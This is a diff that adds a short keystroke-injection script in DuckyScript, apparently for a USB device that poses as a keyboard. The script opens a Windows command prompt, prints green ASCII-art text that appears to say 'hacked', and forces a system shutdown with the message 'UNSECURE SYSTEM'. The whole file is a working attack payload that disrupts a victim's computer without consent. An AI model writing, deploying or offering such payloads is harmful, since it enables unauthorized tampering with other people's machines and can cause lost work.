@@ -1,0 +1,33 @@
+DELAY 1500
+GUI r
+DELAY 500
+STRING cmd
+DELAY 100
+ENTER
+DELAY 400
+STRING color 2
+DELAY 20
+ENTER
+STRING echo                                                             
+DELAY 20
+ENTER
+ENTER
+STRING mode con: cols=70 lines=20
+ENTER
+STRING @echo off
+DELAY 2
+ENTER
+STRING echo   88                                88                           88     88                                88                           88     88                                88                           88     88,dPPYba,  ,adPPYYba,  ,adPPYba, 88   ,d8  ,adPPYba,  ,adPPYb,88     88P'    "8a ""     `Y8 a8"     "" 88 ,a8"  a8P_____88 a8"    `Y88     88       88 ,adPPPPP88 8b         8888[    8PP""""""" 8b       88     88       88 88,    ,88 "8a,   ,aa 88`"Yba, "8b,   ,aa "8a,   ,d88     88       88 `"8bbdP"Y8  `"Ybbd8"' 88   `Y8a `"Ybbd8"'  `"8bbdP"Y8  
+DELAY 5
+ENTER
+ENTER
+ENTER
+DELAY 200                                                                   
+STRING echo   SHUT DOWN 
+ENTER 
+DELAY 100
+STRING Shutdown /s /t 5 /c "e 5 19 : UNSECURE SYSTEM"
+DELAY 10
+ENTER
+DELAY 10
+ENTER
